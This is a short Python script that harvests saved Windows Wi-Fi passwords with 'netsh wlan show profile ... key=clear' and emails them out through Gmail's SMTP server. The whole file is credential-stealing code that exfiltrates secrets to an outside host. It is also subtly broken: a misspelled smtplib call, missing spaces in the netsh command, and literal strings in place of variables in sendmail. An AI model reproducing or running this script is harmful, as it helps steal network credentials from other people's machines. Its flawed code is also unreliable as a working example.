#!/usr/bin/python

import subprocess, smtplib, re

command1 = "netsh wlan show profile"
networks = subprocess.check_output(command1,shell = True)
network_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

final_output = ""
for network in network_list:
	command2 = "netsh wlan show profile" + network + "key=clear"
	one_network_result = subprocess.check_output(command2, shell=True)
	final_output += one_network_result
Email1 = raw_input("Enter Email to Send to :")
Email2 = raw_input("Enter Email to Send to :")

server = smtplib.smpt("smtp.gmail.com", 587)
server.starttls()
server.login("Email","password")
server.sendmail("Email1","Email2", final_output)


server.quit()
